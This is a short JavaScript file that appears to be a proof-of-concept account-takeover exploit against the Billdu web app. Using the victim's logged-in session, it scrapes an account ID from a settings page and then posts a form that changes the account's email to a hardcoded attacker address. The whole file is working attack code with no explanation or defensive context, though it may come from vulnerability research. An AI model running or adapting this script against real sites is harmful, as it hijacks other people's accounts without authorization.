var attackerEmail = "wexah9390@hikuhu.com";

console.log("Starting ATO exploit");

fetch('https://my.billdu.com/company.settings.homepage/default', {
    method: 'GET',
    credentials: 'include'
})
.then(response => response.text())
.then(html => {
    var parser = new DOMParser();
    var doc = parser.parseFromString(html, 'text/html');
    var link = doc.querySelector('a[href^="/company.settings.accounts.edit/edit/"]');
    if (link) {
        var id = link.getAttribute('href').split('/').pop();
        console.log('Extracted ID:', id);
    }

    var formData = new FormData();
    formData.append('btnSave', 'Save');
    formData.append('fullname', '');
    formData.append('email', attackerEmail);
    formData.append('phone', '');
    formData.append('signatureImage', '');
    formData.append('_do', 'form-form-submit');

    return fetch(`https://my.billdu.com/company.settings.accounts.edit/edit/${id}`, {
        method: 'POST',
        body: formData,
        credentials: 'include'
    });
})
.then(response => response.text())
.then(data => {
    console.log('POST request successful');
})
.catch(error => {
    console.error('Error:', error);
});
